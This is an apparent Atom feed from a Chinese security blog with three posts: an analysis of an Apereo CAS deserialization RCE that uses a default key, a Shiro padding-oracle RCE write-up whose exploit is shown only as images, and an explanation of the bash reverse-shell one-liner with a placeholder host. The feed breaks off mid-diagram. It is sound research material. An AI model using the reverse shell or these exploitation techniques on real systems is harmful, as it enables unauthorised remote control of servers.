<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>00theway&#39;s blog</title>
  <icon>https://www.gravatar.com/avatar/58f332b6b2ffcb3971ac54b001f62f29</icon>
  <subtitle>OnTheWay</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.00theway.org/"/>
  <updated>2020-01-11T12:34:56.925Z</updated>
  <id>https://www.00theway.org/</id>
  
  <author>
    <name>00theway</name>
    <email>admin@00theway.org</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>apereo cas rce</title>
    <link href="https://www.00theway.org/2020/01/04/apereo-cas-rce/"/>
    <id>https://www.00theway.org/2020/01/04/apereo-cas-rce/</id>
    <published>2020-01-04T11:11:41.000Z</published>
    <updated>2020-01-11T12:34:56.925Z</updated>
    
    <content type="html"><![CDATA[<p><img src="banner.png" alt></p><h1 id="背景介绍">背景介绍</h1><p>Apereo CAS 是一个开源的企业级单点登录系统，很多统一认证系统都是机遇此系统二次开发，在一次攻防演练项目中CAS反序列化漏洞立下了汗马功劳，在网上能找到的相关描述仅限于官网的一个<a href="https://apereo.github.io/2016/04/08/commonsvulndisc/" target="_blank" rel="noopener">通告</a>，于是拿来研究分享一下。</p><h1 id="漏洞环境">漏洞环境</h1><p>直接使用docker运行了4.1.6的cas环境,将源代码拷贝出来以供分析。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                              NAMES</span><br><span class="line"><span class="number">91</span>ae98e6388d        apereo/cas:v4<span class="number">.1</span><span class="number">.6</span>   <span class="string">"/cas-overlay/bin/ru…"</span>   <span class="number">9</span> days ago          Up <span class="number">20</span> seconds       <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">32773</span>-&gt;<span class="number">8080</span>/tcp, <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">32772</span>-&gt;<span class="number">8443</span>/tcp</span><br><span class="line"># docker cp <span class="number">91</span>ae98e6388d:/cas-overlay ~/worksation/cas_4_1_6</span><br></pre></td></tr></table></figure><h1 id="漏洞分析">漏洞分析</h1><h3 id="1-cas如何处理请求">1. CAS如何处理请求</h3><p>Apereo CAS 使用了spring webflow来处理登录、退出等请求，处理流程可以看一下这篇文章<a href="https://blog.csdn.net/joeljx/article/details/88812944" target="_blank" rel="noopener">CAS单点登录开源框架解读（三）–CAS单点登录服务端认证之loginFlowRegistry流程</a>。</p><h3 id="2-漏洞触发流程">2. 漏洞触发流程</h3><p>cas中关于登录的配置文件如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /WEB-INF/cas-servlet.xml</span></span><br><span class="line">  &lt;bean <span class="attribute">id</span>=<span class="string">"loginHandlerAdapter"</span></span><br><span class="line">        <span class="attribute">class</span>=<span class="string">"org.jasig.cas.web.flow.SelectiveFlowHandlerAdapter"</span></span><br><span class="line">        p:<span class="attribute">supportedFlowId</span>=<span class="string">"login"</span></span><br><span class="line">        p:<span class="attribute">flowExecutor-ref</span>=<span class="string">"loginFlowExecutor"</span></span><br><span class="line">        p:<span class="attribute">flowUrlHandler-ref</span>=<span class="string">"loginFlowUrlHandler"</span> /&gt;</span><br></pre></td></tr></table></figure><p>当新的登录请求到达时，Spring会调用 “org.jasig.cas.web.flow.SelectiveFlowHandlerAdapter”类 的handle函数来处理请求，这个类的handle函数实现在他的父类里边，关键代码如下</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.springframework.webflow.mvc.servlet.FlowHandlerAdapter.class</span></span><br><span class="line"></span><br><span class="line">public ModelAndView handle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;</span><br><span class="line">        FlowHandler flowHandler = (FlowHandler)handler;</span><br><span class="line">        this.check<span class="constructor">AndPrepare(<span class="params">request</span>, <span class="params">response</span>, <span class="params">false</span>)</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// flowExecutionKey是POST的“execution”的参数值，其中的flowUrlHandler在登录相关的配置文件中有配置“p:flowUrlHandler-ref="loginFlowUrlHandler"”</span></span><br><span class="line">        String flowExecutionKey = this.flowUrlHandler.get<span class="constructor">FlowExecutionKey(<span class="params">request</span>)</span>;</span><br><span class="line">        <span class="keyword">if</span> (flowExecutionKey != null) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ServletExternalContext context = this.create<span class="constructor">ServletExternalContext(<span class="params">request</span>, <span class="params">response</span>)</span>;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">//用来恢复execute中存储的当前状态，漏洞从这里开始，其中flowExecutor在登录相关的配置文件中可以找到</span></span><br><span class="line">                             <span class="comment">//p:flowExecutor-ref="loginFlowExecutor"，loginFlowExecutor对应的类为“org.springframework.webflow.executor.FlowExecutorImpl”</span></span><br><span class="line">                FlowExecutionResult result = this.flowExecutor.resume<span class="constructor">Execution(<span class="params">flowExecutionKey</span>, <span class="params">context</span>)</span>;</span><br><span class="line">                this.handle<span class="constructor">FlowExecutionResult(<span class="params">result</span>, <span class="params">context</span>, <span class="params">request</span>, <span class="params">response</span>, <span class="params">flowHandler</span>)</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>跟进看一下 &quot;this.flowExecutor.resumeExecution(flowExecutionKey, context);&quot;是如何恢复状态的</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.springframework.webflow.executor.FlowExecutorImpl.class</span></span><br><span class="line"></span><br><span class="line">public FlowExecutionResult resume<span class="constructor">Execution(String <span class="params">flowExecutionKey</span>, ExternalContext <span class="params">context</span>)</span> throws FlowException &#123;</span><br><span class="line">        FlowExecutionResult var6;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (logger.is<span class="constructor">DebugEnabled()</span>) &#123;</span><br><span class="line">                logger.debug(<span class="string">"Resuming flow execution with key '"</span> + flowExecutionKey);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">ExternalContextHolder</span>.</span></span>set<span class="constructor">ExternalContext(<span class="params">context</span>)</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 简单解析flowExecutionKey的数据到FlowExecutionKey对象，供后续使用</span></span><br><span class="line">            FlowExecutionKey key = this.executionRepository.parse<span class="constructor">FlowExecutionKey(<span class="params">flowExecutionKey</span>)</span>;</span><br><span class="line">            FlowExecutionLock lock = this.executionRepository.get<span class="constructor">Lock(<span class="params">key</span>)</span>;</span><br><span class="line">            lock.lock<span class="literal">()</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//通过FlowExecutionKey恢复状态，其中处理不当导致了反序列化漏洞</span></span><br><span class="line">                FlowExecution flowExecution = this.executionRepository.get<span class="constructor">FlowExecution(<span class="params">key</span>)</span>;</span><br><span class="line">                flowExecution.resume(context);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>继续跟进“this.executionRepository.getFlowExecution(key);”的处理流程</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.jasig.spring.webflow.plugin.ClientFlowExecutionRepository.class</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> FlowExecution getFlowExecution(FlowExecutionKey <span class="built_in">key</span>) <span class="keyword">throws</span> FlowExecutionRepositoryException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(<span class="built_in">key</span> <span class="keyword">instanceof</span> ClientFlowExecutionKey)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Expected instance of ClientFlowExecutionKey but got "</span> + <span class="built_in">key</span>.getClass().getName());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 从上一步解析出的key对象中获取序列化相关的数据</span></span><br><span class="line">            <span class="built_in">byte</span>[] encoded = ((ClientFlowExecutionKey)<span class="built_in">key</span>).getData();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//在this.transcoder.decode(encoded)代码解密中同时进行了反序列化恢复状态</span></span><br><span class="line">                ClientFlowExecutionRepository.SerializedFlowExecutionState state = (ClientFlowExecutionRepository.SerializedFlowExecutionState)<span class="keyword">this</span>.transcoder.decode(encoded);</span><br><span class="line">                ...</span><br></pre></td></tr></table></figure><p>简单看一下解密相关的代码，漏洞触发点</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.jasig.spring.webflow.plugin.EncryptedTranscoder.class</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object decode(byte[] encoded) throws IOException &#123;</span><br><span class="line">        byte[] data;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            data = <span class="built_in">this</span>.cipherBean.decrypt(encoded);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">IOException</span>(<span class="string">"Decryption error"</span>, var11);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream inBuffer = <span class="keyword">new</span> <span class="type">ByteArrayInputStream</span>(data);</span><br><span class="line">        ObjectInputStream <span class="keyword">in</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        Object var5;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.compression) &#123;</span><br><span class="line">                <span class="keyword">in</span> = <span class="keyword">new</span> <span class="type">ObjectInputStream</span>(<span class="keyword">new</span> <span class="type">GZIPInputStream</span>(inBuffer));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">in</span> = <span class="keyword">new</span> <span class="type">ObjectInputStream</span>(inBuffer);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 触发反序列化漏洞</span></span><br><span class="line">            var5 = <span class="keyword">in</span>.readObject();</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>可以看到作者有意识的对序列化数据进行了加密，并使用配置的cipherBean进行解密</p><p>看一下cipherBean的相关配置</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"loginFlowStateTranscoder"</span> <span class="attr">class</span>=<span class="string">"org.jasig.spring.webflow.plugin.EncryptedTranscoder"</span></span></span></span><br><span class="line"><span class="xml">          c:cipherBean-ref="loginFlowCipherBean" /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"loginFlowCipherBean"</span> <span class="attr">class</span>=<span class="string">"org.cryptacular.bean.BufferedBlockCipherBean"</span></span></span></span><br><span class="line"><span class="xml">          p:keyAlias="$</span><span class="template-variable">&#123;cas.webflow.keyalias:aes128&#125;</span><span class="xml">"</span></span><br><span class="line"><span class="xml">          p:keyStore-ref="loginFlowCipherKeystore"</span></span><br><span class="line"><span class="xml">          p:keyPassword="$</span><span class="template-variable">&#123;cas.webflow.keypassword:changeit&#125;</span><span class="xml">"&gt;</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"nonce"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.cryptacular.generator.sp80038a.RBGNonce"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"blockCipherSpec"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.cryptacular.spec.BufferedBlockCipherSpec"</span></span></span></span><br><span class="line"><span class="xml">                  c:algName="$</span><span class="template-variable">&#123;cas.webflow.cipher.alg:AES&#125;</span><span class="xml">"</span></span><br><span class="line"><span class="xml">                  c:cipherMode="$</span><span class="template-variable">&#123;cas.webflow.cipher.mode:CBC&#125;</span><span class="xml">"</span></span><br><span class="line"><span class="xml">                  c:cipherPadding="$</span><span class="template-variable">&#123;cas.webflow.cipher.padding:PKCS7&#125;</span><span class="xml">" /&gt;</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"loginFlowCipherKeystore"</span> <span class="attr">class</span>=<span class="string">"java.security.KeyStore"</span></span></span></span><br><span class="line"><span class="xml">          factory-bean="loginFlowCipherKeystoreFactory" factory-method="newInstance" /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"loginFlowCipherKeystoreFactory"</span> <span class="attr">class</span>=<span class="string">"org.cryptacular.bean.KeyStoreFactoryBean"</span></span></span></span><br><span class="line"><span class="xml">          c:type="$</span><span class="template-variable">&#123;cas.webflow.keystore.type:JCEKS&#125;</span><span class="xml">"</span></span><br><span class="line"><span class="xml">          c:password="$</span><span class="template-variable">&#123;cas.webflow.keystore.password:changeit&#125;</span><span class="xml">"&gt;</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">"resource"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.cryptacular.io.URLResource"</span></span></span></span><br><span class="line"><span class="xml">                  c:url="$</span><span class="template-variable">&#123;cas.webflow.keystore:classpath:/etc/keystore.jceks&#125;</span><span class="xml">" /&gt;</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>加解密相关的配置会先去配置文件中获取，没有配置相关信息的会使用默认的密钥信息（默认keystore配置位于spring-webflow-client-repo-1.0.0.jar包当中），由于cas默认配置文件中没有对密钥进行配置，导致我们可以用默认的密钥加密序列化数据进行攻击。</p><p>分析漏洞之余去看了一下导致漏洞的spring-webflow-client-repo这个jar包的github主页<a href="https://github.com/serac/spring-webflow-client-repo" target="_blank" rel="noopener">spring-webflow-client-repo</a></p><p>在主页中作者有对这个包存在安全风险做了相关提示</p><p><img src="security.png" alt></p><p>如果开发者在使用一个新的第三方包之前详细的去了解一下作者的介绍完全可以避免这个漏洞的存在。</p><h1 id="漏洞利用">漏洞利用</h1><p>对于反序列化漏洞单纯利用是比较简单的，这里不做过多介绍。这里重点介绍一下在web环境中有可以回显的exploit。</p><p>关于web回显方法</p><ol><li><a href="https://xz.aliyun.com/t/2272" target="_blank" rel="noopener">报错回显</a></li><li>获取response对象</li></ol><p>之前在调试&quot;Nexus Repository Manager 3&quot;的表达式执行漏洞时候发现&quot;Thread.currentThread()&quot;的“threadLocals”变量中会保存当前线程相关的一些资源，其中就可能存在response对象。</p><p><img src="threadLocals.png" alt></p><p>这种方法会相对麻烦，因为需要去遍历列表判断是否为目标对象。</p><p>这里使用常见的通过静态方法获取response对象，对整个项目进行搜索发现了一个静态方法满足我们的需求</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">org</span><span class="selector-class">.springframework</span><span class="selector-class">.webflow</span><span class="selector-class">.context</span><span class="selector-class">.ExternalContextHolder</span><span class="selector-class">.getExternalContext</span>()</span><br></pre></td></tr></table></figure><p>通过这个方法可以获取到当前进行关联的上下文信息，然后通过“getNativeRequest()”方法获取request对象通过getNativeResponse()<br>方法获取response对象。</p><blockquote><p>可以通过 “org.springframework.cglib.core.ReflectUtils.defineClass().newInstance();”这个public方法来加载我们的payload。</p></blockquote><h1 id="enter-hacking">Enter-hacking</h1><blockquote><p>自己动手，丰衣足食。</p></blockquote><p><img src="exploit.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;banner.png&quot; alt&gt;&lt;/p&gt;
&lt;h1 id=&quot;背景介绍&quot;&gt;背景介绍&lt;/h1&gt;
&lt;p&gt;Apereo CAS 是一个开源的企业级单点登录系统，很多统一认证系统都是机遇此系统二次开发，在一次攻防演练项目中CAS反序列化漏洞立下了汗马功劳，在网上能找
      
    
    </summary>
    
    
    
      <category term="rce" scheme="https://www.00theway.org/tags/rce/"/>
    
      <category term="apereo cas" scheme="https://www.00theway.org/tags/apereo-cas/"/>
    
      <category term="Java Deserialization" scheme="https://www.00theway.org/tags/Java-Deserialization/"/>
    
  </entry>
  
  <entry>
    <title>Shiro RCE again (Padding Oracle Attack)</title>
    <link href="https://www.00theway.org/2019/11/13/Shiro-RCE-again-Padding-Oracle-Attack/"/>
    <id>https://www.00theway.org/2019/11/13/Shiro-RCE-again-Padding-Oracle-Attack/</id>
    <published>2019-11-13T09:06:22.000Z</published>
    <updated>2020-01-04T09:19:50.436Z</updated>
    
    <content type="html"><![CDATA[<p><img src="title.png" alt></p><h1 id="背景介绍">背景介绍</h1><p>前一段时间Apache发了一个Shiro的漏洞通告<a href="https://issues.apache.org/jira/browse/SHIRO-721" target="_blank" rel="noopener">RememberMe Padding Oracle Vulnerability</a>，原因是Shiro使用了AES-128-CBC模式对cookie进行加密，导致恶意用户可以通过padding oracle攻击方式构造序列化数据进行<a href="https://issues.apache.org/jira/browse/SHIRO-550" target="_blank" rel="noopener">反序列化攻击</a>。</p><p>SHIRO是一个JAVA WEB中使用率很高的权限管理组件，平时HW、攻防演练遇到的也很多，于是拿来研究一下,记录一下。</p><h1 id="漏洞分析">漏洞分析</h1><p>shiro反序列化的攻击流程大家都比较熟悉，然而这次漏洞加入了padding oracle攻击方式比较令人费解，这里首先介绍一下padding oracle的利用方式。</p><h2 id="padding-oracle构造数据">Padding Oracle构造数据</h2><p>网上已经有很多介绍Padding Oracle Attack的原理介绍和利用方法的文章，但是绝大部分都是讲如何获取明文，这就让人很难利用Padding Oracle方式攻击Shiro，Padding Oracle的另外一种利用方法就是构造加密数据，可以参考这篇文章。<br><a href="https://blog.skullsecurity.org/2016/going-the-other-way-with-padding-oracles-encrypting-arbitrary-data" target="_blank" rel="noopener">Going the other way with padding oracles: Encrypting arbitrary data!</a></p><p>利用Padding Oracle构造密文</p><p>Select a string, P, that you want to generate ciphertext, C, for<br>Pad the string to be a multiple of the blocksize, using appropriate padding, then split it into blocks numbered from 1 to N<br>Generate a block of random data (CN – ultimately, the final block of ciphertext)<br>For each block of plaintext, starting with the last one…</p><pre><code>* Create a two-block string of ciphertext, C’, by combining an empty block (00000…) with the most recently generated ciphertext block (Cn+1) (or the random one if it’s the first round)* Change the last byte of the empty block until the padding errors go away, then use math (see below for way more detail) to set the last byte to 2 and change the second-last byte till it works. Then change the last two bytes to 3 and figure out the third-last, fourth-last, etc.* After determining the full block, XOR it with the plaintext block Pn to create Cn* Repeat the above process for each block (prepend an empty block to the new ciphertext block, calculate it, etc)</code></pre><p>To put that in English: each block of ciphertext decrypts to an unknown value, then is XOR’d with the previous block of ciphertext. By carefully selecting the previous block, we can control what the next block decrypts to. Even if the next block decrypts to a bunch of garbage, it’s still being XOR’d to a value that we control, and can therefore be set to anything we want.</p><p>以下是对整个过程的一个java实现的核心代码片段，原文看不懂可以结合代码理解</p><p><img src="padding-oracle.png" alt></p><h2 id="shiro中利用">shiro中利用</h2><p>shiro对cookie的处理过程</p><p><img src="shiro-flow.png" alt></p><p>认证失败时会设置deleteMe的cookie</p><p><img src="auth-fail.png" alt></p><p>认证成功则不会设置deleteMe的cookie</p><p><img src="auth-success.png" alt></p><p>根据以上条件我们的思路是在正常序列化数据（需要一个已知的用户凭证获取正常序列化数据）后利用padding oracle构造我们自己的数据（需要学习的另一个知识点是java序列化数据后的脏数据不影响反序列化结果，感谢@imbeee），此时会有两种情况</p><ul><li>构造的数据不能通过字符填充验证，返回deleteme</li><li>构造的数据可以成功解密通过字符填充验证，之后数据可以正常反序列化，不返回deleteme的cookie</li></ul><h1 id="enter-hacking">Enter-hacking</h1><ul><li>ysoserial生成payload</li></ul><p><img src="generate-ser.png" alt></p><ul><li>生成加密后的paylaod</li></ul><p><img src="padding-payload.png" alt></p><ul><li>点击生成计算器</li></ul><p><img src="exploit.png" alt></p><p>这个漏洞利用方式尽然有些鸡肋，但shiro框架是红队评估中很常见，只有了解了漏洞的每一个细节，才能在红队行动中攻城掠地。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;title.png&quot; alt&gt;&lt;/p&gt;
&lt;h1 id=&quot;背景介绍&quot;&gt;背景介绍&lt;/h1&gt;
&lt;p&gt;前一段时间Apache发了一个Shiro的漏洞通告&lt;a href=&quot;https://issues.apache.org/jira/browse/SHIRO-72
      
    
    </summary>
    
    
    
      <category term="shiro" scheme="https://www.00theway.org/tags/shiro/"/>
    
      <category term="rce" scheme="https://www.00theway.org/tags/rce/"/>
    
      <category term="exploit" scheme="https://www.00theway.org/tags/exploit/"/>
    
  </entry>
  
  <entry>
    <title>bash reverse shell</title>
    <link href="https://www.00theway.org/2017/07/11/bash-reverse-shell/"/>
    <id>https://www.00theway.org/2017/07/11/bash-reverse-shell/</id>
    <published>2017-07-11T08:55:23.000Z</published>
    <updated>2020-01-04T09:02:44.805Z</updated>
    
    <content type="html"><![CDATA[<h1 id="bash-反弹shell">bash 反弹shell</h1><p>下边是一段熟悉而又陌生的代码，经常被用来在linux环境下反弹shell</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/host<span class="built_in">/port </span>0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>然而长时间以来对它的原理一直是似懂非懂，于是就抽时间研究了一下</p><blockquote><p>用到的特殊文件介绍</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;/dev/tcp/host/port</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>当操作上边文件时， bash 会打开一个与文件关联的socket，读写文件就相当于对socket连接进行读写操作。</p></blockquote><p>在执行一个命令之前，bash shell会把标准输入输出重定向到特殊的文件描述符</p><ul><li>文件描述符0 表示标准输入</li><li>文件描述符1 表示标准输出</li><li>文件描述符2 表示标准错误</li></ul><p>反弹shell语句里边用到了 “&gt;&amp;” 操作符，“&gt;&amp;” 操作符在不同情况下有不通的含义</p><ul><li>在“&gt;&amp;word”语法中，当word不是数字或“-”字符时，“&gt;&amp;”表示标准输出和标准错误重定向到文件，此时与操作符“&amp;&gt;”功能一样。</li><li>在“&gt;&amp;word”语法中，当word是数字或“-”字符时，操作符“&gt;&amp;”表示复制输出文件描述符</li></ul><p>仅有代码”bash -i”时输入输出状态</p><blockquote><p>0代表标准输入，1代表标准输出，2代表标准错误</p></blockquote><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">标准输入、标准输出和标准错误</span> <span class="comment">全部指向shell（此状态定义为状态A）</span></span><br><span class="line"><span class="comment"></span> --<span class="literal">-</span>       <span class="literal">+</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">+</span></span><br><span class="line"><span class="comment">(</span> <span class="comment">0</span> <span class="comment">)</span> --<span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">|</span> <span class="comment">shell</span>  <span class="comment">|</span></span><br><span class="line"><span class="comment"></span> --<span class="literal">-</span>       <span class="literal">+</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">+</span></span><br><span class="line"> --<span class="literal">-</span>       <span class="literal">+</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">+</span></span><br><span class="line"><span class="comment">(</span> <span class="comment">1</span> <span class="comment">)</span> --<span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">|</span> <span class="comment">shell</span>  <span class="comment">|</span></span><br><span class="line"><span class="comment"></span> --<span class="literal">-</span>       <span class="literal">+</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">+</span></span><br><span class="line"> </span><br><span class="line"> --<span class="literal">-</span>       <span class="literal">+</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">+</span></span><br><span class="line"><span class="comment">(</span> <span class="comment">2</span> <span class="comment">)</span> --<span class="literal">-</span><span class="literal">-</span>&gt;<span class="comment">|</span>  <span class="comment">shell</span> <span class="comment">|</span></span><br><span class="line"><span class="comment"></span> --<span class="literal">-</span>       <span class="literal">+</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">+</span></span><br></pre></td></tr></table></figure><p>命令“&gt;&amp; /dev/tcp/host/port”是对标准输出和标准错误的重定向，此时的输入输出状态</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">标准输入指向shell，标准输出和标准错误指向socket连接文件（此状态定义为状态B）</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+</span><br><span class="line"><span class="params">( 0 )</span> <span class="params">----</span>&gt;| shell  |</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+</span><br><span class="line"> <span class="params">---</span>       +<span class="params">--------</span>+           +<span class="params">------------------</span>+</span><br><span class="line"><span class="params">( 1 )</span> <span class="params">----</span>&gt;| shell  |  <span class="params">-----</span>&gt;   |<span class="string">/dev/tcp/host/port</span>|</span><br><span 